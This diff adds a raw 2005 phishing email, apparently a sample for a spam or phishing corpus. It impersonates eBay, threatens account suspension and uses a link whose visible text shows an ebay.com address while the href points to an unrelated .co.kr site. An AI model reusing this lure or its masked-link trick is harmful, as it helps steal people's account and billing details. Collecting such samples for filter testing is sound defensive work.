@@ -1,0 +1,59 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 506172A88C
+	for <user@example.com>; Thu,  3 Nov 2005 16:57:04 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+	id 44257621C9C; Thu,  3 Nov 2005 16:57:04 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id E0603621C92
+	for <user@example.com>; Thu,  3 Nov 2005 16:57:03 -0500 (EST)
+Received: (from user@localhost)
+	by mail.example.com id QAA00129
+	for user@example.com; Thu, 3 Nov 2005 16:57:03 -0500
+Received: from eBay.com ([203.98.170.10])
+	by mail.example.com with SMTP id QAA00110
+	for <user@example.com>; Thu, 3 Nov 2005 16:57:00 -0500
+Message-Id: <200511032157.QAA00110@mail.example.com>
+From: <suppovj@eBay.com>
+To: <user@biochemistry.BIOC.cwru.edu>
+Subject: eBay Security Validation - Update Account Notizc
+Date: Thu, 3 Nov 2005 16:57:10 -0500
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Length: 958
+Lines: 27
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 227
+
+<html>
+<br>Dear eBay Community Member,
+<br>It has come to our attention that your eBay billing informations are
+<br>out of order. If you could please take 5-10 minutes out of your
+<br>online experience and update your personal records you will not run
+<br>into any future problems with the online service. However, failure
+<br>to update your records will result in account suspension. Please
+<br>update your records by November 10th.
+<br>
+<br>
+<br>Once you have updated your account records your eBay session will not
+be
+<br>interrupted and will continue as normal. Failure to update will result in
+<br>cancellation of service, Terms of Service (TOS) violations or future
+<br>problems.
+<br>
+<br>To update your eBay records click here:
+<br><a HREF="http://expo93.co.kr/ws/ebayISAPI.dll/UPdate/index.html"
+target="_self">http://cgi1.ebay.com/aw-cgi/ebayISAPI.dll?UPdate</a>
+<br>
+<br>Thank you for using eBay.
+<br>
+<br>Regards,
+<br>eBay Billing
+</html>
+
+knsexp
+
